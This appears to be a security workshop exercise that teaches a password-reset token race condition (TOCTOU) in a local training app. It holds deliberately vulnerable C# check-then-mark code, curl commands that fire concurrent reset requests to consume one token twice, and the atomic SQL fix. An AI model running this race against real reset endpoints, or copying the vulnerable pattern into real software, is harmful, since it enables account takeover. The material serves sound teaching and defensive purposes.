# Exercise 07 — Race Conditions: Password Reset Token

**Difficulty:** Intermediate  
**Category:** Race Conditions / TOCTOU  
**OWASP Top 10:** A07:2021 — Identification and Authentication Failures  
**Config flag:** `BookingDojo:Workshop:PasswordResetRaceCondition`

---

## Scenario

The password reset flow issues a single-use token. The token invalidation is implemented as check-then-mark: the server reads the token, confirms `UsedAt IS NULL`, waits (simulating real-world I/O), then marks it used and updates the password. Two concurrent requests with the same token can both pass the check before either writes — allowing an attacker who intercepts one reset token to use it twice: setting the password to one they control and locking the victim out.

---

## Background

Password reset tokens are a high-value target: a single stolen token can grant account takeover. The TOCTOU pattern is especially dangerous here because:

- The token is often transmitted over insecure channels (email, SMS)
- The race window can persist for hundreds of milliseconds in real implementations
- The victim does not know the token has been double-consumed — both write operations succeed silently

---

## Setup

```bash
docker compose up -d
dotnet run --project src/BookingDojo.Api -- --seed-and-exit
dotnet run --project src/BookingDojo.Api &
dotnet run --project src/BookingDojo.Bff &
cd src/bookingdojo-ui && npm run dev &
```

In `src/BookingDojo.Api/appsettings.json`:

```json
"PasswordResetRaceCondition": "Vulnerable"
```

> **Note:** The forgot-password and reset-password endpoints are public — no login cookie is needed to call them.

---

## Step 1 — Request a reset token

```bash
curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq .
```

Expected response (workshop returns the token directly — production would email it):

```json
{
  "message": "Reset token issued (workshop: token returned in response, not emailed)",
  "resetToken": "a3f8c1d2e9b04f67...",
  "expiresAt": "2026-05-07T14:00:00Z"
}
```

Save the token:

```bash
TOKEN="a3f8c1d2e9b04f67..."
```

---

## Step 2 — Observe normal single-use behaviour

```bash
# First use — succeeds
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"NewPass1234!\"}" | jq .

# Second use with the same token — rejected
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"AnotherPass!\"}" | jq .
```

Expected: first returns `200 OK`, second returns `400 Bad Request`:

```json
{ "message": "Invalid or expired reset token" }
```

Restore the partner password before continuing:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Partner1234!\"}" | jq .
```

---

## Step 3 — Understand the vulnerable code

```csharp
// Time of Check
var token = await _db.PasswordResetTokens.Include(t => t.User)
    .FirstOrDefaultAsync(t => t.Token == request.Token
                           && t.UsedAt == null
                           && t.ExpiresAt > now);
if (token == null)
    return BadRequest("Invalid or expired reset token");

// Race window — 500 ms artificial delay
await Task.Delay(500);

// Time of Use — another request may have already set UsedAt
token.UsedAt = DateTime.UtcNow;
token.User.PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.NewPassword);
await _db.SaveChangesAsync();
```

The window between reading `UsedAt IS NULL` and writing `UsedAt = now` is the race window. Both concurrent requests read `UsedAt = null`, both pass, and both write — last writer wins the password.

---

## Step 4 — Exploit the race

Get a fresh token, then send two concurrent requests with different passwords before either marks the token used:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

echo "Token: $TOKEN"

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Attacker1234!\"}" | jq . &

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Victim5678!\"}" | jq . &

wait
```

Expected: **both** return `200 OK` — the token was consumed twice.

Verify which password won (whichever write landed last):

```bash
# Try attacker password
curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Attacker1234!"}' | jq -r '.username // "WRONG"'

# Try victim password
curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Victim5678!"}' | jq -r '.username // "WRONG"'
```

One will print `partner`, the other `WRONG`. In a real attack the attacker retries the race until their write lands last, permanently locking the victim out.

Restore the account before moving on:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Partner1234!\"}" | jq .
```

---

## Step 5 — Apply the fix

In `appsettings.json`:

```json
"PasswordResetRaceCondition": "Fixed"
```

Restart the API, request a fresh token, and repeat the exploit:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Attacker1234!\"}" | jq . &

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Victim5678!\"}" | jq . &

wait
```

Expected: exactly one `200 OK` and one `409 Conflict`:

```json
{ "message": "Invalid, expired, or already-used reset token" }
```

The fixed code:

```sql
UPDATE bookingdojo."PasswordResetTokens"
SET "UsedAt" = @now
WHERE "Token" = @token AND "UsedAt" IS NULL AND "ExpiresAt" > @now
```

Both requests race to run this statement. Only the one that executes first satisfies `UsedAt IS NULL`; the other sees 0 rows affected and returns 409. The password update only runs after the atomic claim succeeds.

---

## Step 6 — Discussion

| Control | Protection |
|---------|-----------|
| Atomic UPDATE WHERE UsedAt IS NULL | Closes the race window at the DB layer |
| Short token expiry (< 15 min) | Limits interception opportunity |
| One active token per user | Invalidating old tokens on new request (already implemented) |
| Rate limiting on reset endpoint | Prevents brute-force of token space |
| Secure token delivery (signed email link) | Reduces interception risk |

---

## Key Takeaways

- **Single-use does not mean atomic.** Checking `UsedAt IS NULL` then writing it are two operations; between them the same token can be validated by a second request.
- **Email delivery widens the window.** In production the race window is not 500 ms — it can be minutes while the victim opens their inbox. More time means more retries for the attacker.
- **The fix is a WHERE clause.** One line of SQL closes the race at zero cost to performance.

---

## Further Reading

- [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [CWE-362 — Race Condition](https://cwe.mitre.org/data/definitions/362.html)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
